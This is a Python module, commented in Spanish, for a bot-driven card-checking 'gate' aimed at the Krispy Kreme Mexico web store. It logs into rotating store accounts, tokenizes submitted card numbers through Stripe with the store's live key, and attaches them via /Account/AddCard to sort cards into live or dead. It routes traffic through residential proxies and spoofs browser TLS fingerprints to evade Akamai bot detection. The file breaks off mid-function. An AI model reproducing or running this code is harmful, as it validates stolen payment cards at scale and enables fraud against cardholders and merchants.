"""Gate Radamantis ($1 MXN) — Krispy Kreme MX, alta de tarjeta (AddCard).

Adaptación del gate `donas2.py` (Krispy/donas2.py) al motor de Hades.
Comandos del bot: `/rd` (unitario), `/rdmass` (lote), `/rdstop` (cortar lote).

FLUJO MEDIDO (bloque KrispyKreme de la skill atenea-gateway)
------------------------------------------------------------
    1. GET  https://tienda.krispykreme.mx/              warmup / Akamai
    2. POST /Authentication/Authentication               login (multipart)
    3. POST /Cart/SetCart                               {cardId: ""}
    4. POST /Authentication/Authentication/VerifyLogin   dice quién eres
    5. GET  /Account/CardModalView                      trae el pk_live
    6. POST https://api.stripe.com/v1/tokens            token fresco (DIRECTO)
    7. POST /Account/AddCard                            multipart -> VEREDICTO

REGLAS DURAS (medidas, no supuestas)
------------------------------------
*   El token de Stripe es de UN SOLO USO: token NUEVO por intento.
    Reusarlo devuelve `token_already_used` y no prueba nada.
*   Sin login (sesión de invitado) el backend responde `email_invalid`:
    NO hay veredicto de tarjeta, solo un filtro de sesión.
*   El token de Stripe NO consulta al emisor (`cvc_check=unchecked`):
    el veredicto real es el de `/Account/AddCard`.
*   El pool de IPRoyal NO llega a `api.stripe.com` (403 en CONNECT):
    el token se crea en directo (IP del VPS) y el sitio va por proxy.
*   La cuenta de la tienda acepta máximo 3 tarjetas: en modo masivo se
    rota de cuenta cuando la anterior se llena.
*   `/Account/CardModalView` devuelve HTTP 500 si no hubo `SignupGuest`
    + `SetCart` antes: es warmup incompleto, no un muro.

INTERFAZ HADES
--------------
    async def radamantis_gate_check(card_data, user_id=None) -> dict
    async def radamantis_gate_check_multiple(cards_data, callback=None, user_id=None) -> list

El resultado trae: status ("✅ Live" / "❌ Dead" / "⚠️ Error"), message
(texto corto para el usuario) y classification (etiqueta fina del veredicto).
"""
from __future__ import annotations

import asyncio
import logging
import os
import re
import secrets
import time
from dataclasses import dataclass
from typing import Any, Callable, Dict, List, Optional, Tuple
from urllib.parse import quote

from bot.config import IPROYAL_HOST, IPROYAL_PASS, IPROYAL_USER, gate_proxy

logger = logging.getLogger(__name__)


# ─────────────────────────────────────────────────────────────
# CONFIGURACIÓN
# ─────────────────────────────────────────────────────────────
SITE = "https://tienda.krispykreme.mx"
STRIPE_TOKENS = "https://api.stripe.com/v1/tokens"

# pk_live de la tienda (Sale de /Account/CardModalView; el fallback coincide
# con el del modal, verificado 2026-10-21).
PK_FALLBACK = (
    "pk_live_51OjVj8FXiwuOsp7TTDvOZMPwEf81Jf8vmLt0pj9Mip3RcjHQIMyV4FIV9UKdIKY9"
    "WBY0GiFd1Oo2NY4Dpd0L3VrR00XBj375RZ"
)

# Sin `payment_user_agent` móvil, Stripe responde 400 "This integration
# surface is unsupported for publishable key".
PUA_ANDROID = "stripe-android/20.26.0"

# El perfil TLS debe ir coherente con el User-Agent (lección de la skill).
UA_DESKTOP = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36"
)

BROWSER_HEADERS: Dict[str, str] = {
    "User-Agent": UA_DESKTOP,
    "Accept": (
        "text/html,application/xhtml+xml,application/xml;q=0.9,"
        "image/avif,image/webp,*/*;q=0.8"
    ),
    "Accept-Language": "es-MX,es;q=0.9,en;q=0.8",
    "sec-ch-ua": '"Chromium";v="150", "Not)A;Brand";v="24", "Google Chrome";v="150"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-User": "?1",
    "Upgrade-Insecure-Requests": "1",
}


def _env_bool(name: str, default: bool = False) -> bool:
    raw = (os.getenv(name) or "").strip().lower()
    if not raw:
        return default
    return raw not in ("0", "false", "no", "off")


KRISPY_PK = os.getenv("KRISPY_PK", "") or PK_FALLBACK
KRISPY_EMAIL = (os.getenv("KRISPY_EMAIL") or "").strip()
KRISPY_PASSWORD = os.getenv("KRISPY_PASSWORD") or ""
KRISPY_ACCOUNTS_FILE = os.getenv(
    "KRISPY_ACCOUNTS_FILE", "data/gates/krispy_accounts.txt"
).strip()
KRISPY_COUNTRY = (os.getenv("KRISPY_COUNTRY") or "mx").lower()
KRISPY_LIFETIME = (os.getenv("KRISPY_LIFETIME") or "10m").strip()
KRISPY_PROXY = (os.getenv("KRISPY_PROXY") or "").strip()
KRISPY_IMPERSONATE = (os.getenv("KRISPY_IMPERSONATE") or "chrome150").strip()
KRISPY_TIMEOUT = float(os.getenv("KRISPY_TIMEOUT") or 30)
KRISPY_ALLOW_DIRECT = _env_bool("KRISPY_ALLOW_DIRECT", False)
KRISPY_ALLOW_GUEST = _env_bool("KRISPY_ALLOW_GUEST", False)
KRISPY_MAX_CARDS_PER_ACCOUNT = int(os.getenv("KRISPY_MAX_CARDS_PER_ACCOUNT") or 3)
KRISPY_HOLDER_FIRST = (os.getenv("KRISPY_HOLDER_FIRST") or "GATE").strip()
KRISPY_HOLDER_LAST = (os.getenv("KRISPY_HOLDER_LAST") or "PROBE").strip()
KRISPY_PHONE = (os.getenv("KRISPY_PHONE") or "5512345678").strip()

# PAN de control: Luhn válido pero INEXISTENTE. El endpoint debe responder
# `incorrect_number` con él. Si responde otra cosa, el endpoint está
# rechazando todas las tarjetas y los veredictos no son confiables.
CONTROL_CARD_NUMBER = (os.getenv("KRISPY_CONTROL_CARD") or "4532640527811642").strip()

# Concurrencia global del gate (el proceso es pesado: sesión + token + POST).
_GATE_SEM = asyncio.Semaphore(int(os.getenv("KRISPY_CONCURRENCY") or 2))

# Solo un lote masivo a la vez (una sesión = una IP = un proxy sticky).
_MASS_LOCK = asyncio.Lock()


# ─────────────────────────────────────────────────────────────
# VOCABULARIO DE VEREDICTOS (medido 2026-10-21)
# ─────────────────────────────────────────────────────────────
# codigo del backend -> (status, classification, mensaje para el usuario)
BACKEND_VERDICTS: Dict[str, Tuple[str, str, str]] = {
    "email_invalid": (
        "⚠️ Error",
        "ERROR SESION",
        "La sesion de la tienda no esta disponible, intenta de nuevo",
    ),
    "token_already_used": (
        "⚠️ Error",
        "ERROR TOOL",
        "Error interno del gate, intenta de nuevo",
    ),
    "card_declined": (
        "❌ Dead",
        "DEAD AUTH",
        "Tarjeta declinada por el emisor",
    ),
    "incorrect_number": (
        "❌ Dead",
        "DEAD AUTH",
        "Numero de tarjeta invalido",
    ),
    "expired_card": (
        "❌ Dead",
        "DEAD AUTH",
        "Tarjeta expirada",
    ),
    "insufficient_funds": (
        "✅ Live",
        "LIVE AUTH",
        "El emisor respondio: tarjeta viva",
    ),
    "incorrect_cvc": (
        "✅ Live",
        "LIVE CCN",
        "Tarjeta viva, el CVV es incorrecto",
    ),
    "processing_error": (
        "⚠️ Error",
        "ERROR TOOL",
        "Error de procesamiento en el gate, intenta de nuevo",
    ),
    "": ("❌ Dead", "DEAD AUTH", "Tarjeta sin CVV"),
}

# Filtros de Stripe (ocurren ANTES del backend, en /v1/tokens).
STRIPE_VERDICTS: Dict[str, Tuple[str, str, str]] = {
    "incorrect_number": ("❌ Dead", "DEAD FORMATO", "Numero de tarjeta invalido"),
    "invalid_number": ("❌ Dead", "DEAD FORMATO", "Numero de tarjeta invalido"),
    "invalid_expiry_year": ("❌ Dead", "DEAD FORMATO", "Fecha de expiracion invalida"),
    "invalid_expiry_month": ("❌ Dead", "DEAD FORMATO", "Mes de expiracion invalido"),
    "invalid_cvc": ("❌ Dead", "DEAD FORMATO", "CVV invalido"),
    "expired_card": ("❌ Dead", "DEAD FORMATO", "Tarjeta expirada"),
    "card_declined": (
        "❌ Dead",
        "DEAD FORMATO",
        "Tarjeta rechazada por Stripe antes del emisor",
    ),
}

# Veredictos que cuentan como "la cuenta ya tiene esta tarjeta".
APPROVED_CODES = {"APROBADA"}


# ─────────────────────────────────────────────────────────────
# UTILIDADES
# ─────────────────────────────────────────────────────────────
def _log_real(message: str) -> None:
    """Detalle real al log del servidor (nunca al usuario)."""
    logger.info("[RADAMANTIS REAL] %s", message)


def _xhr_headers(referer: str) -> Dict[str, str]:
    h = dict(BROWSER_HEADERS)
    h.update(
        {
            "X-Requested-With": "XMLHttpRequest",
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Content-Type": "application/json; charset=utf-8",
            "Referer": referer,
        }
    )
    return h


def _form_headers(referer: str) -> Dict[str, str]:
    """Como _xhr_headers pero urlencoded (jQuery lo hace por defecto)."""
    h = _xhr_headers(referer)
    h["Content-Type"] = "application/x-www-form-urlencoded; charset=UTF-8"
    return h


def _multipart(fields: Dict[str, Any]) -> Tuple[bytes, str]:
    """Arma un cuerpo multipart/form-data (el sitio lo manda así)."""
    boundary = "----GateBoundary" + secrets.token_hex(8)
    chunks: List[str] = []
    for key, value in fields.items():
        chunks.append(
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="{key}"\r\n\r\n'
            f"{'' if value is None else value}\r\n"
        )
    body = "".join(chunks) + f"--{boundary}--\r\n"
    return body.encode("utf-8"), f"multipart/form-data; boundary={boundary}"


def _cookie_dict(client: Any) -> Dict[str, str]:
    """Extrae el jar de cookies de curl_cffi o httpx."""
    jar = getattr(client, "cookies", None)
    if jar is None:
        return {}
    if hasattr(jar, "get_dict"):
        try:
            return dict(jar.get_dict())
        except Exception:
            pass
    try:
        return {k: v for k, v in dict(jar).items()}
    except Exception:
        pass
    try:
        return {ck.name: ck.value for ck in jar.jar}
    except Exception:
        return {}


@dataclass
class _Card:
    number: str
    mm: str
    yy: str
    cvv: str

    def show(self) -> str:
        return f"{self.number} {self.mm}/{self.yy} cvc={self.cvv}"


def _normalize_card(card_data: str) -> Optional[_Card]:
    """Acepta cc|mm|aa|cvv y cc|mm|aaaa|cvv. Devuelve None si no es válido."""
    try:
        original = (card_data or "").strip()
        parts = [p.strip() for p in re.split(r"\s*[|/]\s*|\s+", original)]
        if len(parts) != 4:
            return None
        pan, mes, ano, cvv = parts
        if not pan.isdigit() or len(pan) not in (15, 16):
            return None
        if not mes.isdigit() or not (1 <= int(mes) <= 12):
            return None
        if not ano.isdigit():
            return None
        if len(ano) == 4:
            if not (2000 <= int(ano) <= 2099):
                return None
            yy = ano[-2:]
        elif len(ano) == 2:
            yy = ano
        else:
            return None
        if not cvv.isdigit() or len(cvv) not in (3, 4):
            return None
        return _Card(pan, mes.zfill(2), yy, cvv)
    except Exception:
        return None


# ─────────────────────────────────────────────────────────────
# PROXY
# ─────────────────────────────────────────────────────────────
_PROXY_RE = re.compile(
    r"^(?P<scheme>https?)://(?P<user>[^:@/]+):(?P<pw>[^@/]+)"
    r"@(?P<host>[^:/@]+)(?::(?P<port>\d+))?/?$"
)


def _apply_iproyal_suffixes(
    url: str,
    country: str = "",
    session: str = "",
    lifetime: str = "",
) -> str:
    """Rearma la URL de IPRoyal con los sufijos que van en el PASSWORD.

    Formato final: http://user:pass_country-mx_session-xxxx_lifetime-10m@host:port
    """
    m = _PROXY_RE.match((url or "").strip())
    if not m:
        return (url or "").strip()
    scheme = m.group("scheme")
    user = m.group("user")
    pw = m.group("pw")
    host = m.group("host")
    port = m.group("port") or "80"
    # Se quitan los sufijos previos antes de volver a ponerlos.
    base_pw = re.split(r"_(?:country|session|lifetime|city|state|region)-", pw)[0]
    parts: List[str] = []
    if country:
        parts.append(f"country-{country}")
    if session:
        parts.append(f"session-{session}")
    if lifetime:
        parts.append(f"lifetime-{lifetime}")
    full_pw = base_pw + ("_" + "_".join(parts) if parts else "")
    return f"{scheme}://{quote(user, safe='')}:{quote(full_pw, safe='')}@{host}:{port}"


def _pick_proxy(session_id: str) -> Optional[str]:
    """Elige el proxy del gate. Una sesión = un proxy (coherencia de IP)."""
    base = KRISPY_PROXY or gate_proxy(KRISPY_COUNTRY or "mx")
    if not base:
        # Fallback: cadena IPRoyal del .env (config.IPROYAL_*).
        host = IPROYAL_HOST or "geo.iproyal.com:11245"
        base = f"http://{IPROYAL_USER}:{IPROYAL_PASS}@{host}"
    if not base:
        return None
    return _apply_iproyal_suffixes(
        base,
        country=KRISPY_COUNTRY,
        session=session_id,
        lifetime=KRISPY_LIFETIME,
    )


def _new_client(
    proxy_url: Optional[str],
    impersonate: Optional[str],
    timeout: float,
) -> Tuple[Any, str]:
    """Cliente HTTP con huella de navegador (curl_cffi) o httpx pelado."""
    if impersonate:
        try:
            from curl_cffi import requests as creq

            session = creq.Session(impersonate=impersonate)
            try:
                session.timeout = timeout
            except Exception:
                pass
            if proxy_url:
                session.proxies = {"http": proxy_url, "https": proxy_url}
            try:
                session.headers.update(BROWSER_HEADERS)
            except Exception:
                pass
            return session, f"curl_cffi/{impersonate}"
        except ImportError:
            _log_real("curl_cffi no instalado -> se usa httpx (huella TLS menor)")

    import httpx

    try:
        client = httpx.Client(proxy=proxy_url, timeout=timeout, follow_redirects=True)
    except TypeError:  # httpx < 0.26
        client = httpx.Client(proxies=proxy_url, timeout=timeout, follow_redirects=True)
    client.headers.update(BROWSER_HEADERS)
    return client, "httpx"


# ─────────────────────────────────────────────────────────────
# CUENTAS DE LA TIENDA
# ─────────────────────────────────────────────────────────────
def _load_accounts() -> List[Tuple[str, str]]:
    """Cuentas (email, password) para el gate.

    Orden de precedencia:
      1. KRISPY_ACCOUNTS_FILE -> líneas "email|password" (o "email:password").
      2. KRISPY_EMAIL / KRISPY_PASSWORD del .env.
    """
    accounts: List[Tuple[str, str]] = []
    path = KRISPY_ACCOUNTS_FILE
    if path and os.path.exists(path):
        try:
            with open(path, encoding="utf-8", errors="replace") as fh:
                for line in fh:
                    line = line.strip()
                    if not line or line.startswith("#"):
                        continue
                    if "|" in line:
                        email, _, password = line.partition("|")
                    elif ":" in line:
                        email, _, password = line.partition(":")
                    else:
                        continue
                    email = email.strip()
                    password = password.strip()
                    if email and password:
                        accounts.append((email, password))
        except Exception as exc:
            _log_real(f"No se pudo leer {path}: {exc}")

    if not accounts and KRISPY_EMAIL and KRISPY_PASSWORD:
        accounts.append((KRISPY_EMAIL, KRISPY_PASSWORD))

    # Sin duplicados, conservando el orden.
    seen = set()
    unique: List[Tuple[str, str]] = []
    for acc in accounts:
        key = acc[0].lower()
        if key in seen:
            continue
        seen.add(key)
        unique.append(acc)
    return unique


# ─────────────────────────────────────────────────────────────
# TOKEN DE STRIPE (directo: el pool de IPRoyal no llega a api.stripe.com)
# ─────────────────────────────────────────────────────────────
def _stripe_token(client: Any, card: _Card, pk: str) -> Dict[str, Any]:
    """POST /v1/tokens -> detalle del token (id, brand, last4, exp...)."""
    data = {
        "key": pk,
        "card[number]": card.number,
        "card[exp_month]": card.mm,
        "card[exp_year]": card.yy,
        "card[cvc]": card.cvv,
        "payment_user_agent": PUA_ANDROID,
    }
    try:
        response = client.post(
            STRIPE_TOKENS,
            data=data,
            headers={"Accept": "application/json"},
        )
    except Exception as exc:
        return {"ok": False, "error": f"{type(exc).__name__}: {exc}"}

    out: Dict[str, Any] = {"ok": False, "http": response.status_code}
    try:
        payload = response.json()
    except Exception:
        out["error"] = (response.text or "")[:160]
        return out

    token_id = payload.get("id")
    if isinstance(token_id, str) and token_id[:4] in ("tok_", "pm_", "src_"):
        card_info = payload.get("card") or {}
        out.update(
            {
                "ok": True,
                "id": token_id,
                "brand": card_info.get("brand"),
                "last4": card_info.get("last4"),
                "exp_month": card_info.get("exp_month"),
                "exp_year": card_info.get("exp_year"),
                "country": card_info.get("country"),
                "funding": card_info.get("funding"),
                "cvc_check": card_info.get("cvc_check"),
            }
        )
        return out

    error = payload.get("error") or {}
    code = str(error.get("code") or error.get("type") or "?")
    message = str(error.get("message") or "")
    out["error"] = f"{code}: {message}"
    out["code"] = code
    return out


_BINLIST_CACHE: Dict[str, str] = {}


def _binlist_bank(number: str) -> str:
    """El sitio saca el banco de binlist.net y lo manda como CardBankName."""
    bin6 = number[:6]
    if bin6 in _BINLIST_CACHE:
        return _BINLIST_CACHE[bin6]
    bank = ""
    try:
        import httpx

        response = httpx.get(f"https://lookup.binlist.net/{bin6}", timeout=6)
        if response.status_code == 200:
            bank = ((response.json() or {}).get("bank") or {}).get("name") or ""
    except Exception:
        bank = ""
    _BINLIST_CACHE[bin6] = bank
    return bank


# ─────────────────────────────────────────────────────────────
# SESIÓN CONTRA LA TIENDA
# ─────────────────────────────────────────────────────────────
class KrispySession:
    """Sesión (invitada o autenticada) contra tienda.krispykreme.mx.

    Una sesión = una IP = un proxy. Todas las peticiones del flujo salen por
    el mismo proxy: verificar por una IP y procesar por otra rompe la
    coherencia de Akamai y del jar de cookies.
    """

    def __init__(
        self,
        account: Optional[Tuple[str, str]] = None,
        proxy_url: Optional[str] = None,
        timeout: float = KRISPY_TIMEOUT,
        impersonate: Optional[str] = KRISPY_IMPERSONATE,
    ) -> None:
        self.account = account
        self.email = account[0] if account else ""
        self.password = account[1] if account else ""
        self.proxy_url = proxy_url
        self.timeout = timeout
        self.impersonate = impersonate
        self.client: Any = None
        self.backend = "-"
        self.pk = KRISPY_PK
        self.pk_source = "fallback"
        self.authenticated = False
        self.credential = ""
        self.accepted_cards = 0

    # -- ciclo de vida ----------------------------------------------------
    def _connect(self) -> None:
        self.client, self.backend = _new_client(
            self.proxy_url, self.impersonate, self.timeout
        )

    def close(self) -> None:
        if self.client is not None:
            try:
                self.client.close()
            except Exception:
                pass
            self.client = None

    def _request(self, method: str, url: str, **kwargs: Any) -> Any:
        if self.client is None:
            self._connect()
        last_exc: Optional[Exception] = None
        for attempt in range(2):
            try:
                return self.client.request(method, url, **kwargs)
            except Exception as exc:
                last_exc = exc
                if attempt == 0:
                    _log_real(f"{method} {url} fallo: {type(exc).__name__}: {exc}")
                    time.sleep(0.5)
                    continue
                raise
        if last_exc:
            raise last_exc
        raise RuntimeError("petición sin respuesta")

    # -- apertura de sesión ----------------------------------------------
    def open(self) -> Dict[str, Any]:
        """warmup -> (login | invitado) -> SetCart -> VerifyLogin -> modal."""
        info: Dict[str, Any] = {"modo": "invitado", "proxy": bool(self.proxy_url)}
        if self.client is None:
            self._connect()

        # 1) Warmup (Akamai: aquí se cookiea _abck).
        response = self._request(
            "GET", SITE + "/", headers={"Accept": BROWSER_HEADERS["Accept"]}
        )
        info["warmup"] = response.status_code
        info["abck"] = self._abck_state()

        # 2) Sesión.
        if self.email and self.password:
            info["login"] = self._login()
            info["modo"] = "autenticado" if self.authenticated else "INVITADO (fallo login)"
        else:
            info["signup"] = self._signup_guest()
            info["modo"] = "invitado"

        # 3) SetCart (sin esto, CardModalView devuelve 500).
        response = self._request(
            "POST",
            SITE + "/Cart/SetCart",
            headers=_form_headers(SITE + "/Cart"),
            data={"cardId": ""},
        )
        info["setcart"] = response.status_code

        # 4) VerifyLogin: dice si la sesión es de invitado o de cuenta.
        response = self._request(
            "POST",
            SITE + "/Authentication/Authentication/VerifyLogin",
            headers=_form_headers(SITE + "/"),
        )
        try:
            credential = ((response.json() or {}).get("Data") or {}).get("Credential") or {}
            self.credential = str(credential.get("CredentialLogin") or "")[:40]
            info["platform"] = credential.get("CredentialPlatform", "")
        except Exception:
            pass
        info["credential"] = self.credential or "(uuid)"

        # 5) Modal: de aquí sale el pk_live real.
        response = self._request(
            "GET", SITE + "/Account/CardModalView", headers=_xhr_headers(SITE + "/Account/")
        )
        info["modal"] = response.status_code
        harvested = _harvest_pk(response.text or "")
        if harvested:
            self.pk = harvested
            self.pk_source = "modal"
        info["pk_origen"] = self.pk_source
        return info

    def _abck_state(self) -> str:
        jar = _cookie_dict(self.client)
        value = jar.get("_abck", "")
        if not value:
            return "AUSENTE"
        parts = value.split("~")
        if len(parts) < 2:
            return "RARO"
        return "VALIDADA" if parts[1] == "0" else "PENDIENTE"

    def _login(self) -> str:
        body, ctype = _multipart(
            {"ConsumerName": self.email, "Password": self.password}
        )
        headers = _form_headers(SITE + "/Home/LoginView")
        headers["Content-Type"] = ctype
        headers["Origin"] = SITE
        response = self._request(
            "POST", SITE + "/Authentication/Authentication", headers=headers, data=body
        )
        text = response.text or ""
        ok = response.status_code == 200 and '"ReturnCode":200' in text
        self.authenticated = ok
        detail = f"{response.status_code} {text[:120]}"
        if not ok:
            _log_real(f"login fallo: {detail}")
            self._signup_guest()
        return detail

    def _signup_guest(self) -> str:
        import uuid as _uuid

        guest = f"{int(time.time() * 1000)}-{_uuid.uuid4()}"
        response = self._request(
            "POST",
            SITE + "/Authentication/Authentication/SignupGuest",
            headers=_form_headers(SITE + "/"),
            data={"uuid": guest},
        )
        return f"{response.status_code} {(response.text or '')[:60]}"

    # -- verificación de tarjeta -----------------------------------------
    def check_card(self, card: _Card) -> Dict[str, str]:
        """Token fresco + AddCard + veredicto."""
        started = time.perf_counter()
        token_client, _ = _new_client(None, None, self.timeout)
        try:
            token = _stripe_token(token_client, card, self.pk)
        finally:
            try:
                token_client.close()
            except Exception:
                pass

        if not token.get("ok"):
            code = str(token.get("code") or "")
            status, classification, message = STRIPE_VERDICTS.get(
                code, ("❌ Dead", "DEAD FORMATO", "Tarjeta rechazada por el procesador")
            )
            _log_real(
                f"token Stripe fallo ({code}): {token.get('error')} | tarjeta {card.show()}"
            )
            return {
                "status": status,
                "classification": classification,
                "message": message,
                "code": code,
                "elapsed": round(time.perf_counter() - started, 2),
            }

        fields = {
            "CardHolderFirstName": KRISPY_HOLDER_FIRST,
            "CardHolderLastName": KRISPY_HOLDER_LAST,
            "CardExpirationDate": f"{card.mm}/{card.yy}",
            "CardEmail": self.email,
            "CardPhone": KRISPY_PHONE,
            "DeviceId": "null",
            "CardToken": token.get("id", ""),
            "CardLast4": token.get("last4") or card.number[-4:],
            "CardBrand": token.get("brand") or "",
            "CardExpirationMonth": str(token.get("exp_month") or card.mm),
            "CardExpirationYear": str(token.get("exp_year") or "20" + card.yy),
            "CardCountry": token.get("country") or "MX",
            "CardBankName": _binlist_bank(card.number),
        }
        response = self._addcard(fields)
        code, detail = _split_code(response.get("msg", ""))
        rc = response.get("rc")

        if rc == 200:
            self.accepted_cards += 1
            status, classification, message = (
                "✅ Live",
                "APROBADA",
                "Aceptada por el procesador",
            )
        elif code == "" and rc != 500:
            status, classification, message = (
                "⚠️ Error",
                "ERROR TOOL",
                "El procesador no devolvio un codigo de veredicto",
            )
        else:
            status, classification, message = BACKEND_VERDICTS.get(
                code, ("⚠️ Error", "ERROR TOOL", "Codigo desconocido del procesador")
            )

        _log_real(
            f"AddCard rc={rc} code={code!r} status={status} "
            f"detalle={detail[:120]} | tarjeta {card.show()}"
        )
        return {
            "status": status,
            "classification": classification,
            "message": message,
            "code": code,
            "elapsed": round(time.perf_counter() - started, 2),
        }

    # -- control: ¿el endpoint sigue discriminando? -----------------------
    def control_probe(self) -> str:
        """Prueba el endpoint con un PAN que NO existe.

        Medido 2026-10-21: un PAN inexistente devuelve `incorrect_number`
        (el adquirente lo rechaza por el número) y una tarjeta real devuelve
        `card_declined`. Si el control devolviera `card_declined` también, el
        endpoint estaría rechazando TODO y los veredictos por tarjeta no
        serían confiables (no se puede culpar a la tarjeta).
        """
        card = _Card(CONTROL_CARD_NUMBER, "12", "30", "123")
        token_client, _ = _new_client(None, None, self.timeout)
        try:
            token = _stripe_token(token_client, card, self.pk)
        finally:
            try:
                token_client.close()
            except Exception:
                pass
        if not token.get("ok"):
            code = str(token.get("code") or "token_error")
            _log_real(f"control: el token de control fallo ({code})")
            return code
        fields = {
            "CardHolderFirstName": KRISPY_HOLDER_FIRST,
            "CardHolderLastName": KRISPY_HOLDER_LAST,
            "CardExpirationDate": "12/30",
            "CardEmail": self.email,
            "CardPhone": KRISPY_PHONE,
            "DeviceId": "null",
            "CardToken": token.get("id", ""),
            "CardLast4": token.get("last4") or CONTROL_CARD_NUMBER[-4:],
            "CardBrand": token.get("brand") or "",
            "CardExpirationMonth": str(token.get("exp_month") or "12"),
            "CardExpirationYear": str(token.get("exp_year") or "2030"),
            "CardCountry": token.get("country") or "MX",
            "CardBankName": "",
        }
        response = self._addcard(fields)
        code, _ = _split_code(response.get("msg", ""))
        ok = code == "incorrect_number"
        _log_real(
            f"control ({CONTROL_CARD_NUMBER[-4:]}): codigo={code!r} -> "
            f"{'el endpoint sigue discriminando' if ok else 'DEGRADADO: rechaza tambien el control'}"
        )
        return code

    def _addcard(self, fields: Dict[str, Any]) -> Dict[str, Any]:
        """POST multipart a /Account/AddCard."""
        body, ctype = _multipart(fields)
        headers = _xhr_headers(SITE + "/Account/")
        headers["Content-Type"] = ctype
        headers["Origin"] = SITE
        headers["Accept"] = "*/*"
        try:
            response = self._request(
                "POST", SITE + "/Account/AddCard", headers=headers, data=body
            )
        except Exception as exc:
            return {
                "http": None,
                "rc": None,
                "msg": f"EXC {type(exc).__name__}: {exc}",
            }
        raw = response.text or ""
        out: Dict[str, Any] = {"http": response.status_code, "rc": None, "msg": ""}
        try:
            resp = (response.json() or {}).get("Response") or {}
            out["rc"] = resp.get("ReturnCode")
            out["msg"] = str(resp.get("ReturnMessage") or "")
        except Exception:
            out["msg"] = raw[:200]
        return out


def _harvest_pk(html: str) -> str:
    """Saca el pk_live del modal (atributos en cualquier orden)."""
    match = re.search(r"pk_live_[A-Za-z0-9]{20,}", html or "")
    if match:
        return match.group(0)
    tag = re.search(r"<input[^>]*id=\"API_KEY\"[^>]*>", html or "")
    if tag:
        value = re.search(r'value="([^"]+)"', tag.group(0))
        if value and value.group(1).startswith("pk_live_"):
            return value.group(1)
    return ""


def _split_code(message: str) -> Tuple[str, str]:
    """El sitio arma "codigo: mensaje" -> el código va antes del ':'."""
    match = re.match(r"^\s*([A-Za-z_][A-Za-z0-9_\-]*)\s*:\s*(.+)$", message or "", re.S)
    if match:
        return match.group(1), match.group(2).strip()
    return (message or "")[:40].strip() or "(vacio)", message or ""


# ─────────────────────────────────────────────────────────────
# LOTE (una sesión por cuenta, se rota cuando la cuenta se llena)
# ─────────────────────────────────────────────────────────────
class _Batch:
    """Estado del lote: mantiene la sesión viva entre tarjetas."""

    def __init__(self, accounts: List[Tuple[str, str]]) -> None:
        self.accounts = accounts
        self.index = 0
        self.session: Optional[KrispySession] = None
        self.exhausted = False
        # None = sin control hecho | "ok" = el endpoint discrimina |
        # "degradado" = rechaza tambien el PAN de control.
        self.control_state: Optional[str] = None

    def _open_next(self) -> Optional[KrispySession]:
        if self.session is not None:
            try:
                self.session.close()
            except Exception:
                pass
            self.session = None
        while self.index < len(self.accounts):
            account = self.accounts[self.index]
            self.index += 1
            session_id = secrets.token_hex(4)
            proxy_url = _pick_proxy(session_id)
            if not proxy_url and not KRISPY_ALLOW_DIRECT:
                _log_real("sin proxy configurado: se aborta el gate")
                self.exhausted = True
                return None
            session = KrispySession(account=account, proxy_url=proxy_url)
            try:
                info = session.open()
            except Exception as exc:
                _log_real(f"no se pudo abrir la sesion: {type(exc).__name__}: {exc}")
                session.close()
                continue
            _log_real(
                f"sesion abierta modo={info.get('modo')} "
                f"credencial={info.get('credential')} pk={info.get('pk_origen')} "
                f"backend={session.backend}"
            )
            if info.get("modo") != "autenticado" and not KRISPY_ALLOW_GUEST:
                # Sesión de invitado: el backend responde email_invalid y no
                # hay veredicto de tarjeta. Se intenta con la siguiente cuenta.
                _log_real("sesion no autenticada: se prueba otra cuenta")
                session.close()
                continue
            self.session = session
            return session
        self.exhausted = True
        return None

    def check(self, card: _Card) -> Dict[str, str]:
        session = self.session
        if session is None or session.accepted_cards >= KRISPY_MAX_CARDS_PER_ACCOUNT:
            session = self._open_next()
            # Sesión nueva -> el control hay que hacerlo otra vez.
            self.control_state = None
        if session is None:
            return {
                "status": "⚠️ Error",
                "classification": "ERROR SESION",
                "message": "No hay cuentas disponibles en el gate, avisar a un administrador",
                "code": "no_accounts",
                "elapsed": 0.0,
            }
        try:
            result = session.check_card(card)
        except Exception as exc:
            _log_real(f"check fallo: {type(exc).__name__}: {exc}")
            return {
                "status": "⚠️ Error",
                "classification": "ERROR TOOL",
                "message": "Error interno del gate, intenta de nuevo",
                "code": "exception",
                "elapsed": 0.0,
            }

        # Si el veredicto es "dead", se confirma que el endpoint sigue
        # discriminando: si el control también sale rechazado, el problema
        # es el gate/procesador, NO la tarjeta.
        if result.get("code") == "card_declined":
            if self.control_state is None:
                try:
                    control = session.control_probe()
                except Exception as exc:
                    _log_real(f"control fallo: {type(exc).__name__}: {exc}")
                    control = "control_error"
                self.control_state = "ok" if control == "incorrect_number" else "degradado"
            if self.control_state == "degradado":
                _log_real(
                    "el endpoint rechaza tambien el PAN de control: el veredicto "
                    "de esta tarjeta NO es confiable (gate degradado)"
                )
                return {
                    "status": "⚠️ Error",
                    "classification": "GATE DEGRADADO",
                    "message": "El procesador esta rechazando todas las tarjetas: "
                               "el veredicto no es confiable",
                    "code": result.get("code", ""),
                    "elapsed": result.get("elapsed", 0.0),
                }
        return result


# ─────────────────────────────────────────────────────────────
# API PARA HADES
# ─────────────────────────────────────────────────────────────
def _error_result(message: str, classification: str = "ERROR TOOL") -> Dict[str, str]:
    return {
        "status": "⚠️ Error",
        "classification": classification,
        "message": message,
        "code": "",
        "elapsed": 0.0,
    }


async def radamantis_gate_check(
    card_data: str,
    user_id: Optional[int] = None,
) -> Dict[str, str]:
    """Verifica 1 tarjeta contra Krispy Kreme MX."""
    card = _normalize_card(card_data)
    if card is None:
        return {
            "status": "❌ Dead",
            "classification": "DEAD FORMATO",
            "message": "Formato invalido. Usa cc|mes|año|cvv",
            "code": "",
            "elapsed": 0.0,
        }

    accounts = _load_accounts()
    if not accounts:
        _log_real("no hay cuentas configuradas (KRISPY_ACCOUNTS_FILE / KRISPY_EMAIL)")
        return _error_result(
            "El gate no esta configurado, avisar a un administrador",
            "ERROR CONFIG",
        )

    async with _GATE_SEM:
